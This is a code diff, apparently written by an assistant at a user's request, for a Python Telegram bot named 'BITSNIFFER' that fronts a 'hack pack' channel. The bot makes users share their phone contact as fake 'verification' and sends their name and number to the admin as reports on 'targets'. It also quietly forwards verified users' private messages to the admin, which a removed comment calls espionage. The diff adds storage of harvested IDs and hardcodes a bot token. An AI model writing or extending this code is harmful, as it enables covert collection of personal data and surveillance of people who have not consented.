@@ -1,34 +1,58 @@
 import asyncio
 import re
 import logging
+import json
+import os
 from aiogram import Bot, Dispatcher, types, F
 from aiogram.filters import Command
 from aiogram.client.default import DefaultBotProperties
 from aiogram.utils.keyboard import ReplyKeyboardBuilder, InlineKeyboardBuilder
 
 # --- КОНФИГУРАЦИЯ ---
+# Данные установлены согласно вашему распоряжению
 TOKEN = "8606715900:AAFGjZcI5_FiSydtLPnpu0J9QSxMHP9WezA"
 CHANNEL_ID = "@hackpackposter" 
 MY_ADMIN_ID = 7917303098 
+DB_FILE = "users.json"
 
-# Список верифицированных ID (в идеале — БД)
-verified_users = set()
-
+# --- ЛОГИРОВАНИЕ И БД ---
 logging.basicConfig(level=logging.INFO)
 bot = Bot(token=TOKEN, default=DefaultBotProperties(parse_mode="HTML"))
 dp = Dispatcher()
 
+def load_verified_users():
+    """Загрузка базы верифицированных целей из файла"""
+    if os.path.exists(DB_FILE):
+        try:
+            with open(DB_FILE, "r") as f:
+                return set(json.load(f))
+        except Exception as e:
+            logging.error(f"Ошибка загрузки БД: {e}")
+    return set()
+
+def save_verified_users():
+    """Сохранение базы на диск"""
+    try:
+        with open(DB_FILE, "w") as f:
+            json.dump(list(verified_users), f)
+    except Exception as e:
+        logging.error(f"Ошибка сохранения БД: {e}")
+
+verified_users = load_verified_users()
+
 # --- УТИЛИТЫ ---
 
 def clean_and_style(text: str) -> str:
+    """Очистка текста и наложение фирменной подписи"""
     if not text: return ""
-    # Удаляем внешние ссылки и юзернеймы для чистоты
     text = re.sub(r'http\S+', '', text)
     text = re.sub(r'@\S+', '', text)
-    signature = "\n\n<b>💀 Доступ открыт в: @hackpackposter</b>"
+    separator = "\n" + "━" * 15 + "\n"
+    signature = f"{separator}<b>💀 Доступ открыт в: @hackpackposter</b>"
     return text.strip() + signature
 
 def get_post_kb():
+    """Клавиатура для постов в канале"""
     builder = InlineKeyboardBuilder()
     builder.row(types.InlineKeyboardButton(text="👍", callback_data="like"),
                 types.InlineKeyboardButton(text="👎", callback_data="dislike"))
@@ -36,6 +60,7 @@ def get_post_kb():
     return builder.as_markup()
 
 def get_auth_kb():
+    """Клавиатура верификации (агрессивный стиль)"""
     builder = ReplyKeyboardBuilder()
     builder.row(types.KeyboardButton(text="🛡 ПРОЙТИ ВЕРИФИКАЦИЮ", request_contact=True))
     return builder.as_markup(resize_keyboard=True, one_time_keyboard=True)
@@ -50,7 +75,6 @@ async def start_handler(message: types.Message):
     elif u.id in verified_users:
         await message.answer("🦾 <b>Система опознала вас.</b> Добро пожаловать в узел.")
     else:
-        # Лог новой цели для админа
         report = (
             f"🚨 <b>ОБЪЕКТ ЗАФИКСИРОВАН</b>\n"
             f"<b>Имя:</b> {u.full_name}\n"
@@ -65,15 +89,13 @@ async def start_handler(message: types.Message):
 @dp.message(F.contact)
 async def contact_handler(message: types.Message):
     c = message.contact
-    
-    # ПРОВЕРКА: принадлежит ли контакт отправителю?
     if c.user_id != message.from_user.id:
         await message.answer("❌ <b>Ошибка верификации.</b> Вы отправили чужой контакт.")
         await bot.send_message(MY_ADMIN_ID, f"⚠️ <b>ПОПЫТКА ОБМАНА:</b> {message.from_user.id} прислал чужой номер!")
         return
 
-    # Захват данных
     verified_users.add(message.from_user.id)
+    save_verified_users() # Фиксация цели в базе
     
     intel_report = (
         f"🎯 <b>ЦЕЛЬ РАСКРЫТА (VERIFIED)</b>\n"
@@ -91,7 +113,6 @@ async def contact_handler(message: types.Message):
 async def posting_handler(message: types.Message):
     u_id = message.from_user.id
     
-    # 1. Если пишет админ — постим в канал
     if u_id == MY_ADMIN_ID:
         try:
             text = clean_and_style(message.text or message.caption or "")
@@ -110,16 +131,15 @@ async def posting_handler(message: types.Message):
         except Exception as e:
             await message.answer(f"❌ Ошибка: {e}")
             
-    # 2. Если пишет верифицированный юзер — просто логируем (шпионаж)
     elif u_id in verified_users:
         spy_msg = f"👤 <b>Сообщение от верифицированного ({u_id}):</b>\n{message.text or 'Медиа-файл'}"
         await bot.send_message(MY_ADMIN_ID, spy_msg)
         
-    # 3. Если пишет аноним без верификации — требуем контакт
     else:
         await message.answer("⚠️ <b>Доступ заблокирован.</b> Сначала пройдите верификацию через /start.")
 
 async def main():
+    # Отображение узла Тбилиси в консоли
     print(f"--- BITSNIFFER v3.6 ONLINE (Tbilisi Node) ---")
     await dp.start_polling(bot)
 
